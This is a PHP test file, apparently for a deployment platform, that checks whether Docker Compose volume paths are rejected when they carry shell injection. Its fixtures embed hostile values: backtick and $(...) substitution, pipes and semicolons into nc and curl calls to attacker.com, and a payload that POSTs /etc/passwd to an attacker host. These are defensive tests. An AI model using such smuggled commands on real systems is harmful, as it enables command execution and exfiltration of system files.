<?php

use Symfony\Component\Yaml\Yaml;

test('demonstrates array-format volumes from YAML parsing', function () {
    // This is how Docker Compose long syntax looks in YAML
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: ./data
        target: /app/data
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $volumes = $parsed['services']['web']['volumes'];

    // Verify this creates an array format
    expect($volumes[0])->toBeArray();
    expect($volumes[0])->toHaveKey('type');
    expect($volumes[0])->toHaveKey('source');
    expect($volumes[0])->toHaveKey('target');
});

test('malicious array-format volume with backtick injection', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/pwn`curl attacker.com`'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $volumes = $parsed['services']['evil']['volumes'];

    // The malicious volume is now an array
    expect($volumes[0])->toBeArray();
    expect($volumes[0]['source'])->toContain('`');

    // When applicationParser or serviceParser processes this,
    // it should throw an exception due to our validation
    $source = $volumes[0]['source'];
    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class, 'backtick');
});

test('malicious array-format volume with command substitution', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/pwn$(cat /etc/passwd)'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['evil']['volumes'][0]['source'];

    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class, 'command substitution');
});

test('malicious array-format volume with pipe injection', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/file | nc attacker.com 1234'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['evil']['volumes'][0]['source'];

    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class, 'pipe');
});

test('malicious array-format volume with semicolon injection', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/file; curl attacker.com'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['evil']['volumes'][0]['source'];

    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class, 'separator');
});

test('exact example from security report in array format', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  coolify:
    image: alpine
    volumes:
      - type: bind
        source: '/tmp/pwn`curl https://attacker.com -X POST --data "$(cat /etc/passwd)"`'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['coolify']['volumes'][0]['source'];

    // This should be caught by validation
    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class);
});

test('legitimate array-format volumes are allowed', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: ./data
        target: /app/data
      - type: bind
        source: /var/lib/data
        target: /data
      - type: volume
        source: my-volume
        target: /app/volume
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $volumes = $parsed['services']['web']['volumes'];

    // All these legitimate volumes should pass validation
    foreach ($volumes as $volume) {
        $source = $volume['source'];
        expect(fn () => validateShellSafePath($source, 'volume source'))
            ->not->toThrow(Exception::class);
    }
});

test('array-format with environment variables', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: ${DATA_PATH}
        target: /app/data
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['web']['volumes'][0]['source'];

    // Simple environment variables should be allowed
    expect($source)->toBe('${DATA_PATH}');
    // Our validation allows simple env var references
    $isSimpleEnvVar = preg_match('/^\$\{[a-zA-Z_][a-zA-Z0-9_]*\}$/', $source);
    expect($isSimpleEnvVar)->toBe(1); // preg_match returns 1 on success, not true
});

test('array-format with safe environment variable default', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: '${DATA_PATH:-./data}'
        target: /app/data
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['web']['volumes'][0]['source'];

    // Parse correctly extracts the source value
    expect($source)->toBe('${DATA_PATH:-./data}');

    // Safe environment variable with benign default should be allowed
    // The pre-save validation skips env vars with safe defaults
    expect(fn () => validateDockerComposeForInjection($dockerComposeYaml))
        ->not->toThrow(Exception::class);
});

test('array-format with environment variable and path concatenation', function () {
    // This is the reported issue #7127 - ${VAR}/path should be allowed
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - type: bind
        source: '${VOLUMES_PATH}/mysql'
        target: /var/lib/mysql
      - type: bind
        source: '${DATA_PATH}/config'
        target: /etc/config
      - type: bind
        source: '${VOLUME_PATH}/app_data'
        target: /app/data
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);

    // Verify all three volumes have the correct source format
    expect($parsed['services']['web']['volumes'][0]['source'])->toBe('${VOLUMES_PATH}/mysql');
    expect($parsed['services']['web']['volumes'][1]['source'])->toBe('${DATA_PATH}/config');
    expect($parsed['services']['web']['volumes'][2]['source'])->toBe('${VOLUME_PATH}/app_data');

    // The validation should allow this - the reported bug was that it was blocked
    expect(fn () => validateDockerComposeForInjection($dockerComposeYaml))
        ->not->toThrow(Exception::class);
});

test('array-format with malicious environment variable default', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: '${VAR:-/tmp/evil`whoami`}'
        target: /app
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $source = $parsed['services']['evil']['volumes'][0]['source'];

    // This contains backticks and should fail validation
    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class);
});

test('mixed string and array format volumes in same compose', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  web:
    image: nginx
    volumes:
      - './safe/data:/app/data'
      - type: bind
        source: ./another/safe/path
        target: /app/other
      - '/tmp/evil`whoami`:/app/evil'
      - type: bind
        source: '/tmp/evil$(id)'
        target: /app/evil2
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $volumes = $parsed['services']['web']['volumes'];

    // String format malicious volume (index 2)
    expect(fn () => parseDockerVolumeString($volumes[2]))
        ->toThrow(Exception::class);

    // Array format malicious volume (index 3)
    $source = $volumes[3]['source'];
    expect(fn () => validateShellSafePath($source, 'volume source'))
        ->toThrow(Exception::class);

    // Legitimate volumes should work (indexes 0 and 1)
    expect(fn () => parseDockerVolumeString($volumes[0]))
        ->not->toThrow(Exception::class);

    $safeSource = $volumes[1]['source'];
    expect(fn () => validateShellSafePath($safeSource, 'volume source'))
        ->not->toThrow(Exception::class);
});

test('array-format target path injection is also blocked', function () {
    $dockerComposeYaml = <<<'YAML'
services:
  evil:
    image: alpine
    volumes:
      - type: bind
        source: ./data
        target: '/app`whoami`'
YAML;

    $parsed = Yaml::parse($dockerComposeYaml);
    $target = $parsed['services']['evil']['volumes'][0]['target'];

    // Target paths should also be validated
    expect(fn () => validateShellSafePath($target, 'volume target'))
        ->toThrow(Exception::class, 'backtick');
});
